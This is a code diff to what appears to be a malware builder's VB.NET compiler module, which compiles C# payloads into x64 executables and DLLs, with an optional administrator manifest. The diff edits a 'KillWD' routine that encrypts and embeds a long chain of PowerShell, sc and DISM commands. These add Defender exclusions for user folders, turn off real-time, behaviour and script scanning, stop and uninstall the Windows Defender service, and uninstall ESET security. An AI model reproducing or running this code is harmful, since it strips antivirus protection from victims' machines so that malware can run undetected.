@@ -17,7 +17,7 @@ Public Class Codedom
         providerOptions.Add("CompilerVersion", "v4.0")
         Dim CodeProvider As New CSharpCodeProvider(providerOptions)
         Dim Parameters As New CompilerParameters
-        Dim OP As String = " /target:library /platform:anycpu "
+        Dim OP As String = " /target:library /platform:x64 "
 
         With Parameters
             .GenerateExecutable = False
@@ -76,7 +76,7 @@ Public Class Codedom
         providerOptions.Add("CompilerVersion", "v4.0")
         Dim CodeProvider As New CSharpCodeProvider(providerOptions)
         Dim Parameters As New CompilerParameters
-        Dim OP As String = " /target:library /platform:anycpu "
+        Dim OP As String = " /target:library /platform:x64 "
 
         With Parameters
             .GenerateExecutable = False
@@ -113,7 +113,7 @@ Public Class Codedom
         providerOptions.Add("CompilerVersion", "v4.0")
         Dim CodeProvider As New CSharpCodeProvider(providerOptions)
         Dim Parameters As New CompilerParameters
-        Dim OP As String = " /target:winexe /platform:anycpu "
+        Dim OP As String = " /target:winexe /platform:x64 "
 
         If RequireAdministrator Then
             File.WriteAllBytes(SavePath & ".manifest", My.Resources.administrator)
@@ -181,7 +181,7 @@ Public Class Codedom
         providerOptions.Add("CompilerVersion", "v4.0")
         Dim CodeProvider As New CSharpCodeProvider(providerOptions)
         Dim Parameters As New CompilerParameters
-        Dim OP As String = " /target:winexe /platform:anycpu "
+        Dim OP As String = " /target:winexe /platform:x64 "
 
         If F.FA.toggleAdministrator.Checked Then
             File.WriteAllBytes(SavePath & ".manifest", My.Resources.administrator)
@@ -226,7 +226,7 @@ Public Class Codedom
     Public Shared Sub ReplaceGlobals(ByRef stringb As StringBuilder)
         If F.FA.toggleKillWD.Checked Then
             stringb.Replace("DefKillWD", "true")
-            stringb.Replace("#KillWDCommands", F.EncryptString("powershell -Command Add-MpPreference -ExclusionPath '%cd%' & powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Set-MpPreference -DisableArchiveScanning $true & powershell -Command Set-MpPreference -DisableBehaviorMonitoring $true & powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true & powershell -Command Set-MpPreference -DisableScriptScanning $true & powershell -Command Set-MpPreference -DisableIntrusionPreventionSystem $true & powershell -Command Set-MpPreference -DisableIOAVProtection $true & powershell -Command Set-MpPreference -EnableControlledFolderAccess Disabled & powershell -Command Set-MpPreference -EnableNetworkProtection AuditMode -Force & powershell -Command Set-MpPreference -MAPSReporting Disabled & powershell -Command Set-MpPreference -SubmitSamplesConsent NeverSend & powershell New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force & sc config WinDefend start=disabled & sc stop WinDefend & powershell -Command Stop-Service WinDefend  & powershell -Command Set-Service WinDefend -StartupType Disabled & powershell -Command Uninstall-WindowsFeature -Name Windows-Defender & powershell -Command Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI & Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet & Wmic Product where name=""Eset Security"" call uninstall"))
+            stringb.Replace("#KillWDCommands", F.EncryptString("powershell -Command Add-MpPreference -ExclusionPath '%cd%' & powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Set-MpPreference -DisableArchiveScanning $true & powershell -Command Set-MpPreference -DisableBehaviorMonitoring $true & powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true & powershell -Command Set-MpPreference -DisableScriptScanning $true & powershell -Command Set-MpPreference -DisableIntrusionPreventionSystem $true & powershell -Command Set-MpPreference -DisableIOAVProtection $true & powershell -Command Set-MpPreference -EnableControlledFolderAccess Disabled & powershell -Command Set-MpPreference -EnableNetworkProtection AuditMode -Force & powershell -Command Set-MpPreference -MAPSReporting Disabled & powershell -Command Set-MpPreference -SubmitSamplesConsent NeverSend & sc config WinDefend start=disabled & sc stop WinDefend & powershell -Command Stop-Service WinDefend  & powershell -Command Set-Service WinDefend -StartupType Disabled & powershell -Command Uninstall-WindowsFeature -Name Windows-Defender & powershell -Command Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI & Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet & Wmic Product where name=""Eset Security"" call uninstall"))
         End If
 
         If F.FA.toggleEnableDebug.Checked Then
